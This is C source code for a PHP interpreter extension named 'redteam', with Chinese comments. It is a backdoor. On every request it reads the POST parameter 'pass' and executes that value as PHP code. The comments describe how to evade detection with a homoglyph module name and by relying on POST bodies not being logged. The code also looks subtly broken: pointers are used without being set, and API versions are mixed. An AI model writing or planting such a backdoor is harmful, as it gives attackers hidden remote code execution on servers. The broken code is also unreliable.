  #include "php.h"

  
    //模块运行时函数声明

    PHP_RINIT_FUNCTION(redteam);

    
    //zend_module_entry 结构体定义

    zend_module_entry redteam_module_entry = {

    #if ZEND_MODULE_API_NO >= 20010901

    STANDARD_MODULE_HEADER,

    #endif

        "redteam", //模块名，可以考虑用同形异义字， php -m 可以查询到

        NULL,   //导出函数结构体redteam_functions，这里设置为NULL

        NULL,   //PHP_MINIT(redteam) 模块初始化，这里没有用到，设置为NULL

        NULL,   //PHP_MSHUTDOWN(redteam) 模块清理， 这里没有用到，设置为NULL

        PHP_RINIT(redteam), //运行时初始化，这里用到了，下面会着重讲解

        NULL,              //PHP_RSHUTDOWN(redteam) 运行时清理，没有用到，设置为NULL

        NULL,             //PHP_MINFO(redteam)处理phpinfo中的模块信息，没有用到，设置为NULL

        "1.0",           //模块版本

        STANDARD_MODULE_PROPERTIES  

    };

  

    #ifdef COMPILE_DL_redteam

    ZEND_GET_MODULE(redteam);

    #endif


    //模块运行时函数定义

    //只要php解释器加载了这个模块，每个php请求时，都执行该函数

    PHP_RINIT_FUNCTION(redteam)

    {

    

        char* method = "_POST"; // 要过滤的变量，这里为$_POST    ，因为一般情况下POST内容不被服务器记录

        char* secret_string = "pass"; // 特定参数名,有点类似于菜刀的一句话密码，根据参数名做到特定条件下触发后门

        zval** arr; //指向指针的指针

        char* code;


        //在全局作用域（&EG(symbol_table))下收缩$_POST 变量，找到之后将指针值赋给arr

        zend_string *key_str = zend_string_init(method, strlen(method) + 1, 0);
        if (zend_hash_find(&EG(symbol_table), key_str)!= FAILURE) {  

            HashTable* ht = Z_ARRVAL_P(*arr);  //使用宏Z_ARRVAL_P获取数组的值，因为$_POST是个数组

            zval** val;

            //在数组$_POST中查找参数名为pass的值，如果找到，则将值赋给val

            zend_string *key_str1 = zend_string_init(secret_string, strlen(secret_string) + 1, 0);
            if (zend_hash_find(ht, key_str1) != FAILURE) {

                code =  Z_STRVAL_PP(val); // 使用宏Z_STRVAL_PP找到的参数值

                zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); //执行代码，也即变量$_POST[pass]的值

            }

        }

        return SUCCESS;

    }
